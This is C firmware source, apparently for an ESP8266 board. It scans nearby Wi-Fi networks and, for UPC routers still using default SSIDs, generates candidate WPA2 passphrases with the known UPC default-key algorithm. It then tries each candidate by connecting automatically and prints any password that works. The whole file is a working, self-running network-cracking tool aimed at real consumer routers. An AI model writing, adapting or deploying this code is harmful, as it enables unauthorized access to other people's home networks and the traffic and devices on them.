#include "ets_sys.h"
#include "osapi.h"
#include "gpio.h"
#include "os_type.h"
#include "user_config.h"
#include "driver/uart.h"
#include "user_interface.h"

typedef struct {
  uint32_t target;
  unsigned char essid[32];
  uint8_t bssid[6];
  uint8_t password[8];
  bool cracking;
  uint8_t tested;
} ap_t;

// counter for APs seen
size_t last_ap;
ap_t aps[MAX_APS] = {0};

enum {
    SCANNING,
    TARGETING,
    CRACKING,
    CONNECTING,
} state;

size_t ap_to_crack;
size_t ap_timeouts;
static void crack(os_event_t *events);
static void targets_found(void* arg, STATUS status);

#define user_procTaskQueueLen 1
os_event_t user_procTaskQueue[user_procTaskQueueLen];

ICACHE_FLASH_ATTR
static void
scan(os_event_t *events)
{
    if(state == SCANNING){
        state = TARGETING;
        wifi_station_scan(NULL, targets_found);
    } else {
        os_printf("Error: not in scanning state\n");
    }
}

// callback for scan
ICACHE_FLASH_ATTR
static void
targets_found(void* arg, STATUS status){
    struct bss_info *bss_link = (struct bss_info *)arg;
    while (bss_link != NULL){
        bool found = false;
        size_t i;
        for(i = 0; i < MAX_APS; i++){
            if(strncmp(aps[i].essid, bss_link->ssid, 32) == 0){
                found = true;
                os_printf("Found known essid: %s", bss_link->ssid);
                if(aps[i].password[0]){
                    os_printf(" (password: %s )", aps[i].password);
                }
                os_printf("\n");
            }
        }
        if(!found && last_ap < MAX_APS){
            os_printf("Found new essid: %s\n", bss_link->ssid);
            memcpy(aps[last_ap].bssid, bss_link->bssid, 6);
            memcpy(aps[last_ap].essid, bss_link->ssid, 32);
            if(strncmp(bss_link->ssid, "UPC", 3) == 0 && strlen(bss_link->ssid) == 10){
                aps[last_ap].target = 0;
                for(i = 3; i < 10; i++){
                    aps[last_ap].target *= 10;
                    aps[last_ap].target += bss_link->ssid[i]-0x30;
                }
                ap_to_crack = last_ap;
                state = CRACKING;
                system_os_post(CRACK_PRIO, 0, 0 );
                // break here to avoid starting another cracking task
                last_ap++;
                return;
            }
            last_ap++;
        }
        bss_link = bss_link->next.stqe_next;
    }
    state = SCANNING;
    system_os_post(SCAN_PRIO, 0, 0 );
}

char candidate_passwords[8][MAX_CANDIDATE_PASSWORDS];
size_t current_password, passwords_found;

ICACHE_FLASH_ATTR
static void test_passwords(os_event_t *events){
    size_t i;
    if(state != CONNECTING){
        os_printf("Error: not in connecting state\n");
        return;
    }

    if(ap_timeouts == MAX_TIMEOUTS){
        os_printf("AP not seen for 10 seconds, aborting\n");
        current_password = passwords_found;
    }

    if(current_password == passwords_found){
        os_printf("Finished testing passwords\n");
        // done with testing, go back to scanning
        wifi_station_disconnect();
        wifi_station_set_auto_connect(false);
        if(!ap_timeouts && !aps[ap_to_crack].password[0]){
            memcpy(aps[ap_to_crack].password, "<UNKNOWN>", 9);
        }
        state = SCANNING;
        system_os_post(SCAN_PRIO, 0, 0 );
        return;
    }
    if(ap_timeouts == MAX_TIMEOUTS){
        ap_timeouts = 0;
    }

    switch(wifi_station_get_connect_status()){
        case STATION_CONNECTING:
        default:
            break;
        case STATION_WRONG_PASSWORD:
            os_printf("Wrong password!\n");
            current_password++;
            // fall through
        case STATION_IDLE: {
            wifi_station_disconnect();
            wifi_station_set_auto_connect(false);
            ap_timeouts = 0;
            struct station_config config = {0};
            strcpy(config.ssid, aps[ap_to_crack].essid);
            strncpy(config.password, candidate_passwords[current_password], 8);
            memcpy(config.bssid, aps[ap_to_crack].bssid, 6);
            config.bssid_set = 0;
            os_printf("Connecting to %s with password %s\n", config.ssid, config.password);
            wifi_station_set_config(&config);
            wifi_station_set_auto_connect(true);
            wifi_station_connect();
            break;
          }
        case STATION_NO_AP_FOUND:
            ap_timeouts++;
            // 100 ms
            os_delay_us(100000);
            break;
        case STATION_CONNECT_FAIL:
            os_printf("Error connecting... retrying now\n");
            wifi_station_disconnect();
            wifi_station_connect();
            break;
        case STATION_GOT_IP: {
            size_t ap_to_crack, i;
            for(i = 0; i < MAX_APS; i++){
                if(aps[i].target != 0 && !aps[i].cracking){
                    ap_to_crack = i;
                }
            }
            memcpy(aps[ap_to_crack].password, candidate_passwords[current_password], 8);
            os_printf("Found valid password for %s: %s\n", aps[ap_to_crack].essid, aps[ap_to_crack].password);
            // no need to test more
            current_password = passwords_found;
            break;
         }
    }
    system_os_post(CONNECT_PRIO, 0, 0 );
}

ICACHE_FLASH_ATTR
void user_init()
{
    uart_init(115200, 115200);
    os_delay_us(100);

    wifi_set_opmode( 0x1 );
    wifi_station_set_auto_connect(false);

    system_update_cpu_freq(SYS_CPU_160MHZ);

    last_ap = 0;

    // start scanning
    state = SCANNING;
    system_os_task(scan, SCAN_PRIO, user_procTaskQueue, user_procTaskQueueLen);
    system_os_task(crack, CRACK_PRIO, user_procTaskQueue, user_procTaskQueueLen);
    system_os_task(test_passwords, CONNECT_PRIO, user_procTaskQueue, user_procTaskQueueLen);
    system_os_post(SCAN_PRIO, 0, 0 );

}

typedef struct md5_ctx
{
  uint32_t A;
  uint32_t B;
  uint32_t C;
  uint32_t D;

  uint32_t total[2];
  uint32_t buflen;
  uint32_t buffer[32];
} MD5_CTX;
int (*MD5_Init)(MD5_CTX *c) = 0x40009818;
int (*MD5_Update)(MD5_CTX *c, const void *data, unsigned long len) = 0x40009834;
int (*MD5_Final)(unsigned char *md, MD5_CTX *c) = 0x40009900;


/*
 * ----------------------------------------------------------------------------
 * "THE BLASTY-WAREZ LICENSE" (Revision 1):
 * <peter@haxx.in> wrote this file. As long as you retain this notice and don't
 * sell my work you can do whatever you want with this stuff. If we meet some 
 * day, and you think this stuff is worth it, you can intoxicate me in return.
 * ----------------------------------------------------------------------------
 */

#define MAGIC_24GHZ 0xff8d8f20
#define MAGIC_5GHZ 0xffd9da60
#define MAGIC0 0xb21642c9ll
#define MAGIC1 0x68de3afll
#define MAGIC2 0x6b5fca6bll

#define MAX0 9
#define MAX1 99
#define MAX2 9
#define MAX3 9999

ICACHE_FLASH_ATTR
void hash2pass(uint8_t *in_hash, char *out_pass)
{
	uint32_t i, a;

	for (i = 0; i < 8; i++) {
		a = in_hash[i] & 0x1f;
		a -= ((a * MAGIC0) >> 36) * 23;

		a = (a & 0xff) + 0x41;

		if (a >= 'I') a++;
		if (a >= 'L') a++;
		if (a >= 'O') a++;

		out_pass[i] = a;
	}
	out_pass[8] = 0;
}


ICACHE_FLASH_ATTR
uint32_t mangle(uint32_t *pp)
{
	uint32_t a, b;

	a = ((pp[3] * MAGIC1) >> 40) - (pp[3] >> 31);
	b = (pp[3] - a * 9999 + 1) * 11ll;

	return b * (pp[1] * 100 + pp[2] * 10 + pp[0]);
}

ICACHE_FLASH_ATTR
uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
{
	uint32_t a, b;

	a = data[1] * 10 + data[2];
	b = data[0] * 2500000 + a * 6800 + data[3] + magic;

	return b - (((b * MAGIC2) >> 54) - (b >> 31)) * 10000000;
}

ICACHE_FLASH_ATTR
static void crack(os_event_t *events){
    uint32_t buf[4];
    char serial[64];
    char pass[9], tmpstr[17];
    uint8_t h1[16], h2[16];
    uint32_t hv[4], w1, w2, i, cnt = 0;
    MD5_CTX ctx;

    if(state != CRACKING){
        os_printf("Error: not in cracking state\n");
        return;
    }

    if(!aps[ap_to_crack].target){
        return;
    }
    memset(candidate_passwords, 0x0, sizeof(candidate_passwords));

    // breaks the rules by doing a lot of work all at once
	for (buf[0] = 0; buf[0] <= MAX0; buf[0]++) {
        os_printf("Cracking ESSID UPC%07d... %u/%u\n", aps[ap_to_crack].target, buf[0], MAX0);
	for (buf[1] = 0; buf[1] <= MAX1; buf[1]++)
	for (buf[2] = 0; buf[2] <= MAX2; buf[2]++)
	for (buf[3] = 0; buf[3] <= MAX3; buf[3]++) {
        // feed the watchdog so it doesn't reset us
        system_soft_wdt_feed();

        if (upc_generate_ssid(buf, MAGIC_24GHZ) != aps[ap_to_crack].target)
            continue;

        os_sprintf(serial, "SAAP%d%02d%d%04d", buf[0], buf[1], buf[2], buf[3]);

        MD5_Init(&ctx);
        MD5_Update(&ctx, serial, strlen(serial));
        MD5_Final(h1, &ctx);

        for (i = 0; i < 4; i++) {
            hv[i] = *(uint16_t *)(h1 + i*2);
        }

        w1 = mangle(hv);

        for (i = 0; i < 4; i++) {
            hv[i] = *(uint16_t *)(h1 + 8 + i*2);
        }

        w2 = mangle(hv);

        os_sprintf(tmpstr, "%08X%08X", w1, w2);

        MD5_Init(&ctx);
        MD5_Update(&ctx, tmpstr, strlen(tmpstr));
        MD5_Final(h2, &ctx);

        hash2pass(h2, pass);
        os_printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
        memcpy(candidate_passwords[cnt], pass, 8);

		cnt++;
        if(cnt == MAX_CANDIDATE_PASSWORDS){
            break;
        }
    }
    }

    // switch to testing the passwords
    os_printf("Testing generated passwords\n");
    current_password = 0;
    passwords_found = cnt;
    state = CONNECTING;
    system_os_post(CONNECT_PRIO, 0, 0 );
}
